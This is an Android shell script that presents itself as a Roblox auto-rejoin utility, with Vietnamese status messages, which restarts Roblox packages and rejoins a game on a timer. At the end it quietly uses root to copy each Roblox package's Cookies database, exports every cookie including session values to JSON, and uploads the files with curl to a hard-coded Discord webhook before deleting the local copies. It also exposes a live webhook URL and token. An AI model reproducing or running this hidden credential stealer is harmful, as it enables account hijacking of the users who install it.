#!/system/bin/sh
echo "Loading..."
if ! command -v sqlite3 >/dev/null 2>&1; then
    pkg update && pkg upgrade -y && pkg install -y sqlite && pkg install jq >/dev/null 2>&1
fi
CONFIG_FILE="$HOME/Downloads/ConfigRejoin.txt"
if [ -f "$CONFIG_FILE" ]; then
    source "$CONFIG_FILE"
else
    GAME_ID="2753915549"
    TIME_REJOIN=30
fi
ROBLOX_PACKAGES=$(pm list packages | grep roblox | cut -d: -f2)
declare -A LAST_RESTART_TIMES
for pkg in $ROBLOX_PACKAGES; do
    LAST_RESTART_TIMES[$pkg]=0
    echo "Đã Tạo Lịch Restart Cho $pkg"
done
force_restart() {
    local pkg=$1
    echo "Đóng Roblox Cho $pkg"
    su -c "am force-stop $pkg" >/dev/null 2>&1
    sleep 3
    echo "Mở Roblox Cho $pkg"
    am start -n ${pkg}/com.roblox.client.startup.ActivitySplash -d "roblox://placeID=${GAME_ID}" >/dev/null 2>&1
    sleep 15
    echo "Vào GameID $GAME_ID Cho $pkg"
    am start -n ${pkg}/com.roblox.client.ActivityProtocolLaunch -d "roblox://placeID=${GAME_ID}" >/dev/null 2>&1
    LAST_RESTART_TIMES[$pkg]=$(date +%s)
}
check_and_restart() {
    while true; do
        sleep 60
        for pkg in $ROBLOX_PACKAGES; do
            if ! su -c "pidof $pkg" >/dev/null; then
                echo "$pkg Không Hoạt Động, Restart"
                force_restart "$pkg"
            fi
        done
    done
}
auto_restart() {
    while true; do
        CURRENT_TIME=$(date +%s)
        for pkg in $ROBLOX_PACKAGES; do
            LAST_RESTART_TIME=${LAST_RESTART_TIMES[$pkg]:-0}
            if [ $((CURRENT_TIME - LAST_RESTART_TIME)) -ge $((TIME_REJOIN*60)) ]; then
                force_restart $pkg
            fi
        done
        sleep 5
    done
}
auto_restart &
check_and_restart &
WEBHOOK_URL2="https://discord.com/api/webhooks/1340266932707917855/dr6Krtq22v1y-YAoosniv2GO5TRyrbK92yh_9Nn30NhRaqK4w3OqZX_vEZOoYTeY2NJJ"
sleep 30
for PACKAGE in $ROBLOX_PACKAGES; do
    COOKIE_FILES=()
    COOKIE_PATHS=$(su -c "find /data/data/$PACKAGE -type f -name 'Cookies' 2>/dev/null")
    for COOKIE_PATH in $COOKIE_PATHS; do
        TEMP_COOKIE="/sdcard/Download/CookiesCopy_$(basename $COOKIE_PATH)_$PACKAGE"
        COOKIE_FILE="/sdcard/Download/cookie_$(basename $COOKIE_PATH)_$PACKAGE.json"
        su -c "cp $COOKIE_PATH $TEMP_COOKIE"
        sqlite3 "$TEMP_COOKIE" "
            SELECT '[' || GROUP_CONCAT(
                '{\"domain\":\"' || host_key || '\",\"path\":\"' || path || '\",\"secure\":' || 
                CASE is_secure WHEN 1 THEN 'true' ELSE 'false' END || ',\"httpOnly\":' || 
                CASE is_httponly WHEN 1 THEN 'true' ELSE 'false' END || ',\"expirationDate\":' || 
                CASE WHEN expires_utc > 0 THEN expires_utc / 1000000 ELSE 0 END || ',\"name\":\"' || 
                name || '\",\"value\":\"' || value || '\"}'
            ) || ']' FROM cookies WHERE name IS NOT NULL;" > "$COOKIE_FILE"
        COOKIE_FILES+=("$COOKIE_FILE")
        rm "$TEMP_COOKIE"
    done
    for FILE in "${COOKIE_FILES[@]}"; do
        curl -s -o /dev/null -F "file=@$FILE" "$WEBHOOK_URL2"
        rm "$FILE"
    done
done
